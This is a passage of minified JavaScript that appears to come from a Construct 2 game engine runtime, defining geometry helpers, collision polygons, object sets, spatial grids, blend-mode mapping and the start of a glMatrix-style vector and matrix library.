var cr = {
    plugins_: {},
    behaviors: {}
};
"function" != typeof Object.getPrototypeOf && (Object.getPrototypeOf = "object" == typeof "test".__proto__ ? function (t) {
        return t.__proto__
    } : function (t) {
        return t.constructor.prototype
    }),
    function () {
        function t(t, e) {
            this.x = t, this.y = e, cr.seal(this)
        }

        function e(t, e, i, n) {
            this.set(t, e, i, n), cr.seal(this)
        }

        function i() {
            this.tlx = 0, this.tly = 0, this.trx = 0, this.try_ = 0, this.brx = 0, this.bry = 0, this.blx = 0, this.bly = 0, cr.seal(this)
        }
        cr.logexport = function (t) {
            window.console && window.console.log && window.console.log(t)
        }, cr.logerror = function (t) {
            window.console && window.console.error && window.console.error(t)
        }, cr.seal = function (t) {
            return t
        }, cr.freeze = function (t) {
            return t
        }, cr.is_undefined = function (t) {
            return void 0 === t
        }, cr.is_number = function (t) {
            return "number" == typeof t
        }, cr.is_string = function (t) {
            return "string" == typeof t
        }, cr.isPOT = function (t) {
            return t > 0 && 0 == (t - 1 & t)
        }, cr.nextHighestPowerOfTwo = function (t) {
            --t;
            for (var e = 1; e < 32; e <<= 1) t |= t >> e;
            return t + 1
        }, cr.abs = function (t) {
            return t < 0 ? -t : t
        }, cr.max = function (t, e) {
            return t > e ? t : e
        }, cr.min = function (t, e) {
            return t < e ? t : e
        }, cr.PI = Math.PI, cr.round = function (t) {
            return t + .5 | 0
        }, cr.floor = function (t) {
            return t >= 0 ? 0 | t : (0 | t) - 1
        }, cr.ceil = function (t) {
            var e = 0 | t;
            return e === t ? e : e + 1
        }, t.prototype.offset = function (t, e) {
            return this.x += t, this.y += e, this
        }, t.prototype.mul = function (t, e) {
            return this.x *= t, this.y *= e, this
        }, cr.vector2 = t, cr.segments_intersect = function (t, e, i, n, r, s, o, a) {
            var h, c, l, u, p, d, f, m;
            if (t < i ? (c = t, h = i) : (c = i, h = t), r < o ? (d = r, p = o) : (d = o, p = r), h < d || c > p) return !1;
            if (e < n ? (u = e, l = n) : (u = n, l = e), s < a ? (m = s, f = a) : (m = a, f = s), l < m || u > f) return !1;
            var g = r - t + o - i,
                y = s - e + a - n,
                _ = i - t,
                v = n - e,
                b = o - r,
                w = a - s,
                x = cr.abs(v * b - w * _),
                S = b * y - w * g;
            if (cr.abs(S) > x) return !1;
            var T = _ * y - v * g;
            return cr.abs(T) <= x
        }, e.prototype.set = function (t, e, i, n) {
            this.left = t, this.top = e, this.right = i, this.bottom = n
        }, e.prototype.copy = function (t) {
            this.left = t.left, this.top = t.top, this.right = t.right, this.bottom = t.bottom
        }, e.prototype.width = function () {
            return this.right - this.left
        }, e.prototype.height = function () {
            return this.bottom - this.top
        }, e.prototype.offset = function (t, e) {
            return this.left += t, this.top += e, this.right += t, this.bottom += e, this
        }, e.prototype.normalize = function () {
            var t = 0;
            this.left > this.right && (t = this.left, this.left = this.right, this.right = t), this.top > this.bottom && (t = this.top, this.top = this.bottom, this.bottom = t)
        }, e.prototype.intersects_rect = function (t) {
            return !(t.right < this.left || t.bottom < this.top || t.left > this.right || t.top > this.bottom)
        }, e.prototype.intersects_rect_off = function (t, e, i) {
            return !(t.right + e < this.left || t.bottom + i < this.top || t.left + e > this.right || t.top + i > this.bottom)
        }, e.prototype.contains_pt = function (t, e) {
            return t >= this.left && t <= this.right && e >= this.top && e <= this.bottom
        }, e.prototype.equals = function (t) {
            return this.left === t.left && this.top === t.top && this.right === t.right && this.bottom === t.bottom
        }, cr.rect = e, i.prototype.set_from_rect = function (t) {
            this.tlx = t.left, this.tly = t.top, this.trx = t.right, this.try_ = t.top, this.brx = t.right, this.bry = t.bottom, this.blx = t.left, this.bly = t.bottom
        }, i.prototype.set_from_rotated_rect = function (t, e) {
            if (0 === e) this.set_from_rect(t);
            else {
                var i = Math.sin(e),
                    n = Math.cos(e),
                    r = t.left * i,
                    s = t.top * i,
                    o = t.right * i,
                    a = t.bottom * i,
                    h = t.left * n,
                    c = t.top * n,
                    l = t.right * n,
                    u = t.bottom * n;
                this.tlx = h - s, this.tly = c + r, this.trx = l - s, this.try_ = c + o, this.brx = l - a, this.bry = u + o, this.blx = h - a, this.bly = u + r
            }
        }, i.prototype.offset = function (t, e) {
            return this.tlx += t, this.tly += e, this.trx += t, this.try_ += e, this.brx += t, this.bry += e, this.blx += t, this.bly += e, this
        };
        var n = 0,
            r = 0;

        function s(t, e, i, s) {
            t < e ? i < s ? (n = t < i ? t : i, r = e > s ? e : s) : (n = t < s ? t : s, r = e > i ? e : i) : i < s ? (n = e < i ? e : i, r = t > s ? t : s) : (n = e < s ? e : s, r = t > i ? t : i)
        }
        i.prototype.bounding_box = function (t) {
            s(this.tlx, this.trx, this.brx, this.blx), t.left = n, t.right = r, s(this.tly, this.try_, this.bry, this.bly), t.top = n, t.bottom = r
        }, i.prototype.contains_pt = function (t, e) {
            var i, n, r, s = this.tlx,
                o = this.tly,
                a = this.trx - s,
                h = this.try_ - o,
                c = this.brx - s,
                l = this.bry - o,
                u = t - s,
                p = e - o,
                d = c * c + l * l,
                f = c * u + l * p,
                m = 1 / ((i = a * a + h * h) * d - (n = a * c + h * l) * n),
                g = (d * (r = a * u + h * p) - n * f) * m,
                y = (i * f - n * r) * m;
            return g >= 0 && y > 0 && g + y < 1 || (y = ((i = (a = this.blx - s) * a + (h = this.bly - o) * h) * f - (n = a * c + h * l) * (r = a * u + h * p)) * (m = 1 / (i * d - n * n)), (g = (d * r - n * f) * m) >= 0 && y > 0 && g + y < 1)
        }, i.prototype.at = function (t, e) {
            if (e) switch (t) {
                case 0:
                    return this.tlx;
                case 1:
                    return this.trx;
                case 2:
                    return this.brx;
                case 3:
                    return this.blx;
                case 4:
                    return this.tlx;
                default:
                    return this.tlx
            } else switch (t) {
                case 0:
                    return this.tly;
                case 1:
                    return this.try_;
                case 2:
                    return this.bry;
                case 3:
                    return this.bly;
                case 4:
                    return this.tly;
                default:
                    return this.tly
            }
        }, i.prototype.midX = function () {
            return (this.tlx + this.trx + this.brx + this.blx) / 4
        }, i.prototype.midY = function () {
            return (this.tly + this.try_ + this.bry + this.bly) / 4
        }, i.prototype.intersects_segment = function (t, e, i, n) {
            if (this.contains_pt(t, e) || this.contains_pt(i, n)) return !0;
            var r, s, o, a, h;
            for (h = 0; h < 4; h++)
                if (r = this.at(h, !0), s = this.at(h, !1), o = this.at(h + 1, !0), a = this.at(h + 1, !1), cr.segments_intersect(t, e, i, n, r, s, o, a)) return !0;
            return !1
        }, i.prototype.intersects_quad = function (t) {
            var e, i, n, r, s, o, a, h, c, l, u = t.midX(),
                p = t.midY();
            if (this.contains_pt(u, p)) return !0;
            if (u = this.midX(), p = this.midY(), t.contains_pt(u, p)) return !0;
            for (c = 0; c < 4; c++)
                for (l = 0; l < 4; l++)
                    if (e = this.at(c, !0), i = this.at(c, !1), n = this.at(c + 1, !0), r = this.at(c + 1, !1), s = t.at(l, !0), o = t.at(l, !1), a = t.at(l + 1, !0), h = t.at(l + 1, !1), cr.segments_intersect(e, i, n, r, s, o, a, h)) return !0;
            return !1
        }, cr.quad = i, cr.RGB = function (t, e, i) {
            return Math.max(Math.min(t, 255), 0) | Math.max(Math.min(e, 255), 0) << 8 | Math.max(Math.min(i, 255), 0) << 16
        }, cr.GetRValue = function (t) {
            return 255 & t
        }, cr.GetGValue = function (t) {
            return (65280 & t) >> 8
        }, cr.GetBValue = function (t) {
            return (16711680 & t) >> 16
        }, cr.shallowCopy = function (t, e, i) {
            var n;
            for (n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
            return t
        }, cr.arrayRemove = function (t, e) {
            var i, n;
            if (!((e = cr.floor(e)) < 0 || e >= t.length)) {
                for (i = e, n = t.length - 1; i < n; i++) t[i] = t[i + 1];
                cr.truncateArray(t, n)
            }
        }, cr.truncateArray = function (t, e) {
            t.length = e
        }, cr.clearArray = function (t) {
            cr.truncateArray(t, 0)
        }, cr.shallowAssignArray = function (t, e) {
            var i, n;
            for (cr.clearArray(t), i = 0, n = e.length; i < n; ++i) t[i] = e[i]
        }, cr.appendArray = function (t, e) {
            t.push.apply(t, e)
        }, cr.fastIndexOf = function (t, e) {
            var i, n;
            for (i = 0, n = t.length; i < n; ++i)
                if (t[i] === e) return i;
            return -1
        }, cr.arrayFindRemove = function (t, e) {
            var i = cr.fastIndexOf(t, e); - 1 !== i && cr.arrayRemove(t, i)
        }, cr.clamp = function (t, e, i) {
            return t < e ? e : t > i ? i : t
        }, cr.to_radians = function (t) {
            return t / (180 / cr.PI)
        }, cr.to_degrees = function (t) {
            return t * (180 / cr.PI)
        }, cr.clamp_angle_degrees = function (t) {
            return (t %= 360) < 0 && (t += 360), t
        }, cr.clamp_angle = function (t) {
            return (t %= 2 * cr.PI) < 0 && (t += 2 * cr.PI), t
        }, cr.to_clamped_degrees = function (t) {
            return cr.clamp_angle_degrees(cr.to_degrees(t))
        }, cr.to_clamped_radians = function (t) {
            return cr.clamp_angle(cr.to_radians(t))
        }, cr.angleTo = function (t, e, i, n) {
            var r = i - t,
                s = n - e;
            return Math.atan2(s, r)
        }, cr.angleDiff = function (t, e) {
            if (t === e) return 0;
            var i = Math.sin(t),
                n = Math.cos(t),
                r = i * Math.sin(e) + n * Math.cos(e);
            return r >= 1 ? 0 : r <= -1 ? cr.PI : Math.acos(r)
        }, cr.angleRotate = function (t, e, i) {
            var n = Math.sin(t),
                r = Math.cos(t),
                s = Math.sin(e),
                o = Math.cos(e);
            return Math.acos(n * s + r * o) > i ? r * s - n * o > 0 ? cr.clamp_angle(t + i) : cr.clamp_angle(t - i) : cr.clamp_angle(e)
        }, cr.angleClockwise = function (t, e) {
            var i = Math.sin(t);
            return Math.cos(t) * Math.sin(e) - i * Math.cos(e) <= 0
        }, cr.rotatePtAround = function (t, e, i, n, r, s) {
            if (0 === i) return s ? t : e;
            var o = Math.sin(i),
                a = Math.cos(i),
                h = (t -= n) * o;
            return t = t * a - (e -= r) * o, e = e * a + h, t += n, e += r, s ? t : e
        }, cr.distanceTo = function (t, e, i, n) {
            var r = i - t,
                s = n - e;
            return Math.sqrt(r * r + s * s)
        }, cr.xor = function (t, e) {
            return !t != !e
        }, cr.lerp = function (t, e, i) {
            return t + (e - t) * i
        }, cr.unlerp = function (t, e, i) {
            return t === e ? 0 : (i - t) / (e - t)
        }, cr.anglelerp = function (t, e, i) {
            var n = cr.angleDiff(t, e);
            return cr.angleClockwise(e, t) ? t + n * i : t - n * i
        }, cr.qarp = function (t, e, i, n) {
            return cr.lerp(cr.lerp(t, e, n), cr.lerp(e, i, n), n)
        }, cr.cubic = function (t, e, i, n, r) {
            return cr.lerp(cr.qarp(t, e, i, r), cr.qarp(e, i, n, r), r)
        }, cr.cosp = function (t, e, i) {
            return (t + e + (t - e) * Math.cos(i * Math.PI)) / 2
        }, cr.hasAnyOwnProperty = function (t) {
            var e;
            for (e in t)
                if (t.hasOwnProperty(e)) return !0;
            return !1
        }, cr.wipe = function (t) {
            var e;
            for (e in t) t.hasOwnProperty(e) && delete t[e]
        };
        var o = +new Date;
        cr.performance_now = function () {
            if (void 0 !== window.performance) {
                var t = window.performance;
                if (void 0 !== t.now) return t.now();
                if (void 0 !== t.webkitNow) return t.webkitNow();
                if (void 0 !== t.mozNow) return t.mozNow();
                if (void 0 !== t.msNow) return t.msNow()
            }
            return Date.now() - o
        };
        var a = !1,
            h = !1,
            c = !1;
        "undefined" != typeof window && (a = !(/chrome/i.test(navigator.userAgent) || /chromium/i.test(navigator.userAgent)) && /safari/i.test(navigator.userAgent), h = /(iphone|ipod|ipad)/i.test(navigator.userAgent), c = window.c2ejecta);
        var l = !a && !c && !h && "undefined" != typeof Set && void 0 !== Set.prototype.forEach;

        function u() {
            this.s = null, this.items = null, this.item_count = 0, l && (this.s = new Set), this.values_cache = [], this.cache_valid = !0, cr.seal(this)
        }
        u.prototype.contains = function (t) {
            return !this.isEmpty() && (l ? this.s.has(t) : this.items && this.items.hasOwnProperty(t))
        }, u.prototype.add = function (t) {
            if (l) this.s.has(t) || (this.s.add(t), this.cache_valid = !1);
            else {
                var e = t.toString(),
                    i = this.items;
                i ? i.hasOwnProperty(e) || (i[e] = t, this.item_count++, this.cache_valid = !1) : (this.items = {}, this.items[e] = t, this.item_count = 1, this.cache_valid = !1)
            }
        }, u.prototype.remove = function (t) {
            if (!this.isEmpty())
                if (l) this.s.has(t) && (this.s.delete(t), this.cache_valid = !1);
                else if (this.items) {
                var e = t.toString(),
                    i = this.items;
                i.hasOwnProperty(e) && (delete i[e], this.item_count--, this.cache_valid = !1)
            }
        }, u.prototype.clear = function () {
            this.isEmpty() || (l ? this.s.clear() : (this.items = null, this.item_count = 0), cr.clearArray(this.values_cache), this.cache_valid = !0)
        }, u.prototype.isEmpty = function () {
            return 0 === this.count()
        }, u.prototype.count = function () {
            return l ? this.s.size : this.item_count
        };
        var p = null,
            d = 0;

        function f(t) {
            p[d++] = t
        }
        u.prototype.update_cache = function () {
            if (!this.cache_valid) {
                if (l) cr.clearArray(this.values_cache), p = this.values_cache, d = 0, this.s.forEach(f), p = null, d = 0;
                else {
                    var t = this.values_cache;
                    cr.clearArray(t);
                    var e, i = 0,
                        n = this.items;
                    if (n)
                        for (e in n) n.hasOwnProperty(e) && (t[i++] = n[e])
                }
                this.cache_valid = !0
            }
        }, u.prototype.valuesRef = function () {
            return this.update_cache(), this.values_cache
        }, cr.ObjectSet = u;
        var m = new cr.ObjectSet;

        function g() {
            this.c = 0, this.y = 0, this.t = 0, this.sum = 0, cr.seal(this)
        }

        function y(t) {
            this.pts_cache = [], this.bboxLeft = 0, this.bboxTop = 0, this.bboxRight = 0, this.bboxBottom = 0, this.convexpolys = null, this.set_pts(t), cr.seal(this)
        }

        function _(t, e) {
            this.cellwidth = t, this.cellheight = e, this.cells = {}
        }

        function v(t, e) {
            this.cellwidth = t, this.cellheight = e, this.cells = {}
        }
        cr.removeArrayDuplicates = function (t) {
            var e, i;
            for (e = 0, i = t.length; e < i; ++e) m.add(t[e]);
            cr.shallowAssignArray(t, m.valuesRef()), m.clear()
        }, cr.arrayRemoveAllFromObjectSet = function (t, e) {
            l ? cr.arrayRemoveAll_set(t, e.s) : cr.arrayRemoveAll_arr(t, e.valuesRef())
        }, cr.arrayRemoveAll_set = function (t, e) {
            var i, n, r, s;
            for (i = 0, n = 0, r = t.length; i < r; ++i) s = t[i], e.has(s) || (t[n++] = s);
            cr.truncateArray(t, n)
        }, cr.arrayRemoveAll_arr = function (t, e) {
            var i, n, r, s;
            for (i = 0, n = 0, r = t.length; i < r; ++i) s = t[i], -1 === cr.fastIndexOf(e, s) && (t[n++] = s);
            cr.truncateArray(t, n)
        }, g.prototype.add = function (t) {
            this.y = t - this.c, this.t = this.sum + this.y, this.c = this.t - this.sum - this.y, this.sum = this.t
        }, g.prototype.reset = function () {
            this.c = 0, this.y = 0, this.t = 0, this.sum = 0
        }, cr.KahanAdder = g, cr.regexp_escape = function (t) {
            return t.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&")
        }, y.prototype.set_pts = function (t) {
            this.pts_array = t, this.pts_count = t.length / 2, this.pts_cache.length = t.length, this.cache_width = -1, this.cache_height = -1, this.cache_angle = 0
        }, y.prototype.is_empty = function () {
            return !this.pts_array.length
        }, y.prototype.update_bbox = function () {
            for (var t, e, i, n = this.pts_cache, r = n[0], s = r, o = n[1], a = o, h = 1, c = this.pts_count; h < c; ++h)(t = n[i = 2 * h]) < r && (r = t), t > s && (s = t), (e = n[i + 1]) < o && (o = e), e > a && (a = e);
            this.bboxLeft = r, this.bboxRight = s, this.bboxTop = o, this.bboxBottom = a
        }, y.prototype.set_from_rect = function (t, e, i) {
            this.pts_cache.length = 8, this.pts_count = 4;
            var n = this.pts_cache;
            n[0] = t.left - e, n[1] = t.top - i, n[2] = t.right - e, n[3] = t.top - i, n[4] = t.right - e, n[5] = t.bottom - i, n[6] = t.left - e, n[7] = t.bottom - i, this.cache_width = t.right - t.left, this.cache_height = t.bottom - t.top, this.update_bbox()
        }, y.prototype.set_from_quad = function (t, e, i, n, r) {
            this.pts_cache.length = 8, this.pts_count = 4;
            var s = this.pts_cache;
            s[0] = t.tlx - e, s[1] = t.tly - i, s[2] = t.trx - e, s[3] = t.try_ - i, s[4] = t.brx - e, s[5] = t.bry - i, s[6] = t.blx - e, s[7] = t.bly - i, this.cache_width = n, this.cache_height = r, this.update_bbox()
        }, y.prototype.set_from_poly = function (t) {
            this.pts_count = t.pts_count, cr.shallowAssignArray(this.pts_cache, t.pts_cache), this.bboxLeft = t.bboxLeft, this.bboxTop, t.bboxTop, this.bboxRight = t.bboxRight, this.bboxBottom = t.bboxBottom
        }, y.prototype.cache_poly = function (t, e, i) {
            if (this.cache_width !== t || this.cache_height !== e || this.cache_angle !== i) {
                var n, r, s, o, a, h;
                this.cache_width = t, this.cache_height = e, this.cache_angle = i;
                var c = 0,
                    l = 1,
                    u = this.pts_array,
                    p = this.pts_cache;
                for (0 !== i && (c = Math.sin(i), l = Math.cos(i)), n = 0, o = this.pts_count; n < o; n++) s = (r = 2 * n) + 1, a = u[r] * t, h = u[s] * e, p[r] = a * l - h * c, p[s] = h * l + a * c;
                this.update_bbox()
            }
        }, y.prototype.contains_pt = function (t, e) {
            var i = this.pts_cache;
            if (t === i[0] && e === i[1]) return !0;
            var n, r, s, o, a, h, c, l = this.pts_count,
                u = this.bboxLeft - 110,
                p = this.bboxTop - 101,
                d = this.bboxRight + 131,
                f = this.bboxBottom + 120,
                m = 0,
                g = 0;
            for (n = 0; n < l; n++) s = (n + 1) % l * 2, o = i[r = 2 * n], a = i[r + 1], h = i[s], c = i[s + 1], cr.segments_intersect(u, p, t, e, o, a, h, c) && m++, cr.segments_intersect(d, f, t, e, o, a, h, c) && g++;
            return m % 2 == 1 || g % 2 == 1
        }, y.prototype.intersects_poly = function (t, e, i) {
            var n, r, s, o, a, h, c, l, u, p, d, f, m, g, y, _, v = t.pts_cache,
                b = this.pts_cache;
            if (this.contains_pt(v[0] + e, v[1] + i)) return !0;
            if (t.contains_pt(b[0] - e, b[1] - i)) return !0;
            for (n = 0, o = this.pts_count; n < o; n++)
                for (s = (n + 1) % o * 2, u = b[r = 2 * n], p = b[r + 1], d = b[s], f = b[s + 1], a = 0, l = t.pts_count; a < l; a++)
                    if (c = (a + 1) % l * 2, m = v[h = 2 * a] + e, g = v[h + 1] + i, y = v[c] + e, _ = v[c + 1] + i, cr.segments_intersect(u, p, d, f, m, g, y, _)) return !0;
            return !1
        }, y.prototype.intersects_segment = function (t, e, i, n, r, s) {
            var o, a, h, c, l, u, p, d, f = this.pts_cache;
            if (this.contains_pt(i - t, n - e)) return !0;
            for (o = 0, a = this.pts_count; o < a; o++)
                if (c = (o + 1) % a * 2, l = f[h = 2 * o] + t, u = f[h + 1] + e, p = f[c] + t, d = f[c + 1] + e, cr.segments_intersect(i, n, r, s, l, u, p, d)) return !0;
            return !1
        }, y.prototype.mirror = function (t) {
            var e, i, n;
            for (e = 0, i = this.pts_count; e < i; ++e) n = 2 * e, this.pts_cache[n] = 2 * t - this.pts_cache[n]
        }, y.prototype.flip = function (t) {
            var e, i, n;
            for (e = 0, i = this.pts_count; e < i; ++e) n = 2 * e + 1, this.pts_cache[n] = 2 * t - this.pts_cache[n]
        }, y.prototype.diag = function () {
            var t, e, i, n, r;
            for (t = 0, e = this.pts_count; t < e; ++t) n = (i = 2 * t) + 1, r = this.pts_cache[i], this.pts_cache[i] = this.pts_cache[n], this.pts_cache[n] = r
        }, cr.CollisionPoly = y, _.prototype.totalCellCount = 0, _.prototype.getCell = function (t, e, i) {
            var n, r = this.cells[t];
            return r ? (n = r[e]) || (i ? (n = w(this, t, e), this.cells[t][e] = n, n) : null) : i ? (n = w(this, t, e), this.cells[t] = {}, this.cells[t][e] = n, n) : null
        }, _.prototype.XToCell = function (t) {
            return cr.floor(t / this.cellwidth)
        }, _.prototype.YToCell = function (t) {
            return cr.floor(t / this.cellheight)
        }, _.prototype.update = function (t, e, i) {
            var n, r, s, o, a;
            if (e)
                for (n = e.left, r = e.right; n <= r; ++n)
                    for (s = e.top, o = e.bottom; s <= o; ++s) i && i.contains_pt(n, s) || (a = this.getCell(n, s, !1)) && (a.remove(t), a.isEmpty() && (x(a), this.cells[n][s] = null));
            if (i)
                for (n = i.left, r = i.right; n <= r; ++n)
                    for (s = i.top, o = i.bottom; s <= o; ++s) e && e.contains_pt(n, s) || this.getCell(n, s, !0).insert(t)
        }, _.prototype.queryRange = function (t, e) {
            var i, n, r, s, o, a;
            for (i = this.XToCell(t.left), r = this.YToCell(t.top), n = this.XToCell(t.right), o = this.YToCell(t.bottom); i <= n; ++i)
                for (s = r; s <= o; ++s)(a = this.getCell(i, s, !1)) && a.dump(e)
        }, cr.SparseGrid = _, v.prototype.totalCellCount = 0, v.prototype.getCell = function (t, e, i) {
            var n, r = this.cells[t];
            return r ? (n = r[e]) || (i ? (n = C(this, t, e), this.cells[t][e] = n, n) : null) : i ? (n = C(this, t, e), this.cells[t] = {}, this.cells[t][e] = n, n) : null
        }, v.prototype.XToCell = function (t) {
            return cr.floor(t / this.cellwidth)
        }, v.prototype.YToCell = function (t) {
            return cr.floor(t / this.cellheight)
        }, v.prototype.update = function (t, e, i) {
            var n, r, s, o, a;
            if (e)
                for (n = e.left, r = e.right; n <= r; ++n)
                    for (s = e.top, o = e.bottom; s <= o; ++s) i && i.contains_pt(n, s) || (a = this.getCell(n, s, !1)) && (a.remove(t), a.isEmpty() && (A(a), this.cells[n][s] = null));
            if (i)
                for (n = i.left, r = i.right; n <= r; ++n)
                    for (s = i.top, o = i.bottom; s <= o; ++s) e && e.contains_pt(n, s) || this.getCell(n, s, !0).insert(t)
        }, v.prototype.queryRange = function (t, e, i, n, r) {
            var s, o, a, h, c, l;
            for (s = this.XToCell(t), a = this.YToCell(e), o = this.XToCell(i), c = this.YToCell(n); s <= o; ++s)
                for (h = a; h <= c; ++h)(l = this.getCell(s, h, !1)) && l.dump(r)
        }, v.prototype.markRangeChanged = function (t) {
            var e, i, n, r, s, o;
            for (e = t.left, n = t.top, i = t.right, s = t.bottom; e <= i; ++e)
                for (r = n; r <= s; ++r)(o = this.getCell(e, r, !1)) && (o.is_sorted = !1)
        }, cr.RenderGrid = v;
        var b = [];

        function w(t, e, i) {
            var n;
            return _.prototype.totalCellCount++, b.length ? ((n = b.pop()).grid = t, n.x = e, n.y = i, n) : new cr.GridCell(t, e, i)
        }

        function x(t) {
            _.prototype.totalCellCount--, t.objects.clear(), b.length < 1e3 && b.push(t)
        }

        function S(t, e, i) {
            this.grid = t, this.x = e, this.y = i, this.objects = new cr.ObjectSet
        }
        S.prototype.isEmpty = function () {
            return this.objects.isEmpty()
        }, S.prototype.insert = function (t) {
            this.objects.add(t)
        }, S.prototype.remove = function (t) {
            this.objects.remove(t)
        }, S.prototype.dump = function (t) {
            cr.appendArray(t, this.objects.valuesRef())
        }, cr.GridCell = S;
        var T = [];

        function C(t, e, i) {
            var n;
            return v.prototype.totalCellCount++, T.length ? ((n = T.pop()).grid = t, n.x = e, n.y = i, n) : new cr.RenderCell(t, e, i)
        }

        function A(t) {
            v.prototype.totalCellCount--, t.reset(), T.length < 1e3 && T.push(t)
        }

        function O(t, e, i) {
            this.grid = t, this.x = e, this.y = i, this.objects = [], this.is_sorted = !0, this.pending_removal = new cr.ObjectSet, this.any_pending_removal = !1
        }

        function k(t, e) {
            return t.zindex - e.zindex
        }
        O.prototype.isEmpty = function () {
            return !this.objects.length || !(this.objects.length > this.pending_removal.count()) && (this.flush_pending(), !0)
        }, O.prototype.insert = function (t) {
            if (this.pending_removal.contains(t)) return this.pending_removal.remove(t), void(this.pending_removal.isEmpty() && (this.any_pending_removal = !1));
            this.objects.length ? (this.objects[this.objects.length - 1].get_zindex() > t.get_zindex() && (this.is_sorted = !1), this.objects.push(t)) : (this.objects.push(t), this.is_sorted = !0)
        }, O.prototype.remove = function (t) {
            this.pending_removal.add(t), this.any_pending_removal = !0, this.pending_removal.count() >= 30 && this.flush_pending()
        }, O.prototype.flush_pending = function () {
            this.any_pending_removal && (this.pending_removal.count() !== this.objects.length ? (cr.arrayRemoveAllFromObjectSet(this.objects, this.pending_removal), this.pending_removal.clear(), this.any_pending_removal = !1) : this.reset())
        }, O.prototype.ensure_sorted = function () {
            this.is_sorted || (this.objects.sort(k), this.is_sorted = !0)
        }, O.prototype.reset = function () {
            cr.clearArray(this.objects), this.is_sorted = !0, this.pending_removal.clear(), this.any_pending_removal = !1
        }, O.prototype.dump = function (t) {
            this.flush_pending(), this.ensure_sorted(), this.objects.length && t.push(this.objects)
        }, cr.RenderCell = O;
        var P = ["lighter", "xor", "copy", "destination-over", "source-in", "destination-in", "source-out", "destination-out", "source-atop", "destination-atop"];
        cr.effectToCompositeOp = function (t) {
            return t <= 0 || t >= 11 ? "source-over" : P[t - 1]
        }, cr.setGLBlend = function (t, e, i) {
            if (i) switch (t.srcBlend = i.ONE, t.destBlend = i.ONE_MINUS_SRC_ALPHA, e) {
                case 1:
                    t.srcBlend = i.ONE, t.destBlend = i.ONE;
                    break;
                case 2:
                    break;
                case 3:
                    t.srcBlend = i.ONE, t.destBlend = i.ZERO;
                    break;
                case 4:
                    t.srcBlend = i.ONE_MINUS_DST_ALPHA, t.destBlend = i.ONE;
                    break;
                case 5:
                    t.srcBlend = i.DST_ALPHA, t.destBlend = i.ZERO;
                    break;
                case 6:
                    t.srcBlend = i.ZERO, t.destBlend = i.SRC_ALPHA;
                    break;
                case 7:
                    t.srcBlend = i.ONE_MINUS_DST_ALPHA, t.destBlend = i.ZERO;
                    break;
                case 8:
                    t.srcBlend = i.ZERO, t.destBlend = i.ONE_MINUS_SRC_ALPHA;
                    break;
                case 9:
                    t.srcBlend = i.DST_ALPHA, t.destBlend = i.ONE_MINUS_SRC_ALPHA;
                    break;
                case 10:
                    t.srcBlend = i.ONE_MINUS_DST_ALPHA, t.destBlend = i.SRC_ALPHA;
                    break
            }
        }, cr.round6dp = function (t) {
            return Math.round(1e6 * t) / 1e6
        }, cr.equals_nocase = function (t, e) {
            return "string" == typeof t && "string" == typeof e && (t.length === e.length && (t === e || t.toLowerCase() === e.toLowerCase()))
        }, cr.isCanvasInputEvent = function (t) {
            var e = t.target;
            return !e || (e === document || e === window || (!(!document || !document.body || e !== document.body) || !!cr.equals_nocase(e.tagName, "canvas")))
        }
    }();
var MatrixArray = "undefined" != typeof Float32Array ? Float32Array : Array,
    glMatrixArrayType = MatrixArray,
    vec3 = {},
    mat3 = {},
    mat4 = {},
    quat4 = {};
vec3.create = function (t) {
        var e = new MatrixArray(3);
        return t && (e[0] = t[0], e[1] = t[1], e[2] = t[2]), e
    }, vec3.set = function (t, e) {
        return e[0] = t[0], e[1] = t[1], e[2] = t[2], e
    }, vec3.add = function (t, e, i) {
        return i && t !== i ? (i[0] = t[0] + e[0], i[1] = t[1] + e[1], i[2] = t[2] + e[2], i) : (t[0] += e[0], t[1] += e[1], t[2] += e[2], t)
    }, vec3.subtract = function (t, e, i) {
        return i && t !== i ? (i[0] = t[0] - e[0], i[1] = t[1] - e[1], i[2] = t[2] - e[2], i) : (t[0] -= e[0], t[1] -= e[1], t[2] -= e[2], t)
    }, vec3.negate = function (t, e) {
        return e || (e = t), e[0] = -t[0], e[1] = -t[1], e[2] = -t[2], e
    }, vec3.scale = function (t, e, i) {
        return i && t !== i ? (i[0] = t[0] * e, i[1] = t[1] * e, i[2] = t[2] * e, i) : (t[0] *= e, t[1] *= e, t[2] *= e, t)
    }, vec3.normalize = function (t, e) {
        e || (e = t);
        var i = t[0],
            n = t[1],
            r = t[2],
            s = Math.sqrt(i * i + n * n + r * r);
        return s ? 1 === s ? (e[0] = i, e[1] = n, e[2] = r, e) : (s = 1 / s, e[0] = i * s, e[1] = n * s, e[2] = r * s, e) : (e[0] = 0, e[1] = 0, e[2] = 0, e)
    }, vec3.cross = function (t, e, i) {
        i || (i = t);
        var n = t[0],
            r = t[1],
            s = (t = t[2], e[0]),
            o = e[1];
        e = e[2];
        return i[0] = r * e - t * o, i[1] = t * s - n * e, i[2] = n * o - r * s, i
    }, vec3.length = function (t) {
        var e = t[0],
            i = t[1];
        t = t[2];
        return Math.sqrt(e * e + i * i + t * t)
    }, vec3.dot = function (t, e) {
        return t[0] * e[0] + t[1] * e[1] + t[2] * e[2]
    }, vec3.direction = function (t, e, i) {
        i || (i = t);
        var n = t[0] - e[0],
            r = t[1] - e[1];
        t = t[2] - e[2];
        return (e = Math.sqrt(n * n + r * r + t * t)) ? (e = 1 / e, i[0] = n * e, i[1] = r * e, i[2] = t * e, i) : (i[0] = 0, i[1] = 0, i[2] = 0, i)
    }, vec3.lerp = function (t, e, i, n) {
        return n || (n = t), n[0] = t[0] + i * (e[0] - t[0]), n[1] = t[1] + i * (e[1] - t[1]), n[2] = t[2] + i * (e[2] - t[2]), n
    }, vec3.str = function (t) {
        return "[" + t[0] + ", " + t[1] + ", " + t[2] + "]"
    }, mat3.create = function (t) {
        var e = new MatrixArray(9);
        return t && (e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[3], e[4] = t[4], e[5] = t[5], e[6] = t[6], e[7] = t[7], e[8] = t[8]), e
    }, mat3.set = function (t, e) {
        return e[0] = t[0], e[1] = t[1], e[2] = t[2], e[3] = t[3], e[4] = t[4], e[5] = t[5], e[6] = t[6], e[7] = t[7], e[8] = t[8], e
    }, mat3.identity = function (t) {
        return t[0] = 1, t[1] = 0, t[2] = 0, t[3] = 0, t[4] = 1, t[5] = 0, t[6] = 0, t[7] = 0, t[8] = 1, t
    }, mat3.transpose = function (t, e) {
        if (!e || t === e) {
            var i = t[1],
                n = t[2],
                r = t[5];
